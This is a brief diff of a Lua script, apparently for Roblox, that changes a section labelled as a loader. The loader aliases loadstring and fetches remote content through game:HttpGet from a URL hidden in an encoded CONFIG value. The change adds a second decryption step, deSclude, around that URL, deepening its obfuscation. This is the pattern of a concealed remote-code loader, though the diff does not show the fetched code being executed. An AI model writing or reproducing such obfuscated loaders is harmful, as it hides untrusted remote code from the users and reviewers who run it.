@@ -59,7 +59,7 @@ function deSclude(str)
 	print("[Decrypted]:",table.concat(table4))
 	return table.concat(table4)
 end
-local function decodeString(txt)
+function decodeString(txt)
 	local counter = 0
 	local save = ""
 	local output = ""
@@ -138,7 +138,7 @@ end
 --(Loader)
 local _LOAD = loadstring
 local s,a = pcall(function()
-	local _DEC = game:HttpGet(decodeString(CONFIG));
+	local _DEC = game:HttpGet(decodeString(deSclude(CONFIG)));
 end)
 if(not s)then
 	pcall(function()
